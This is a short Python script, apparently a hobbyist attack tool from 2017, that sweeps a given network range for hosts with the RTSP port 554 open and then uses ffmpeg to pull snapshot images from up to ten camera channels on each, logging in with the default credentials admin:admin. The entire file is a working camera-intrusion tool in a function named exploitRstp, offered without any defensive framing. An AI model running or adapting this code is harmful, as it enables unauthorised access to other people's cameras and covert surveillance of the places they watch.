#!/usr/bin/python3
'''
NEW RSTP PROJECT
05/02/2017 by borrachinha
'''

def openPort(target):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.20)
    result = sock.connect_ex((target, 554))
    sock.close()

    if result == 0:
        print(target + " - OPEN")
        listIP.append(result)
        exploitRstp(target)

def exploitRstp(ip):
    cam = 'cam-' + ip + '.jpeg'
    for i in range(10):
        command = ("rtsp://admin:admin@{0}:554/cam/realmonitor?channel={1}&subtype=0".format(ip, i+1))
        subprocess.Popen(['/usr/bin/ffmpeg', '-i', command, '-f', 'image2', cam], stdout=subprocess.PIPE)

if __name__ == '__main__':
    try:
        import sys
        import socket
        import ipcalc
        import subprocess
        import re
        import argparse

        parser = argparse.ArgumentParser(description='Change options for execute the Script',
                                         prefix_chars='--')

        parser.add_argument('--target', action='store', type=str,
                            help='Use for set Network')
        '''
        parser.add_argument('--fast', action='store', type=str,
                            help='fast action')
        '''
        result = parser.parse_args()

        if result.target != None:
            print('Scanning - ' + result.target)
            network = result.target
            for ip in ipcalc.Network(network):
                openPort(str(ip))
        else:
            print("Please enter the valid option")

    except Exception as err:
        print("Option unknow\nTry --help")
        print(err)